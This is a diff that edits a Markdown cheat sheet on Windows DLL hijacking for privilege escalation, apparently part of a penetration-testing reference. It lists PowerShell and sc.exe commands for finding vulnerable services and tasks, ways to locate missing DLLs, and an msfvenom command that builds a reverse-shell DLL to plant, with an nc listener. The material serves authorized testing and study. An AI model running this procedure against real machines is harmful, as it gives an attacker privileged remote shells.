@@ -1,57 +1,34 @@
 # DLL hijacking checks
 
-[← Windows quick reference](../04-windows-privesc.md)
-
-Need: privileged launcher + exact DLL request + writable location in its real search order + trigger. Check architecture and existing copies; KnownDLLs/loaded modules can change search order.
+Needs: privileged launcher + exact DLL request + writable location in its real search order + trigger.
+- Match architecture; KnownDLLs and already-loaded modules change the search order.
 
 ## Find a candidate
-
 ```powershell
 Get-CimInstance -ClassName Win32_Service | Select-Object Name,State,StartName,PathName
 Get-ScheduledTask | Select-Object TaskName,Actions,Principal
 icacls 'C:\Path\To\Application'
 ```
-
-On Kali, inspect a copy of the executable for UTF-16LE DLL names. Windows
-programs may store a `LoadLibrary` argument this way, so an ASCII-only
-`strings` pass can miss it:
-
+Known service/task when broad enumeration is blocked:
+```powershell
+sc.exe qc <SERVICE>
+schtasks.exe /query /tn '<TASK>' /fo LIST /v
+```
+On Kali, on a copy of the exe (UTF-16LE: plain `strings` misses Windows `LoadLibrary` names):
 ```bash
 strings -a -e l scheduler.exe | rg -i '\.dll'
 ```
-
-Replace `scheduler.exe` with the executable under review. The output is a
-candidate list, not proof that a DLL is missing or loaded from a writable path.
-Confirm the exact request at runtime.
-
-Procmon: filter `CreateFile` by process and missing DLL path; confirm the writable directory is searched first.
-
-Known service/task when broad enumeration is restricted:
-
-```powershell
-sc.exe qc <service-name>
-schtasks.exe /query /tn '<task-name>' /fo LIST /v
-```
-
-[Find-ExecutableReferences.ps1](../scripts/Find-ExecutableReferences.ps1):
-
 ```powershell
 .\Find-ExecutableReferences.ps1 'C:\Path\To\application.exe'
 ```
+- String hits are candidates only. Procmon: filter `CreateFile` by process + `NAME NOT FOUND` DLL path; confirm the writable directory is searched first.
+- Script: [Find-ExecutableReferences.ps1](../scripts/Find-ExecutableReferences.ps1).
 
-## Verify the trigger
-
-Name the DLL exactly; match target architecture. Save any original file.
-
+## Plant and trigger
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI-IP> LPORT=<PORT> \
-  -f dll -o <missing-dll-name>.dll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=<PORT> \
+  -f dll -o <MISSING-DLL-NAME>.dll
 nc -lvnp <PORT>
 ```
-
-Place in confirmed path, trigger the privileged launcher, check `whoami`, remove the test DLL.
-
-## References
-
-- [Microsoft DLL search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
-- [Microsoft DLL security](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-security)
+- Exact DLL name, matching architecture. Copy it to the confirmed path, trigger the launcher, check `whoami`.
+- Keep the original file if one existed; remove your test DLL afterwards.
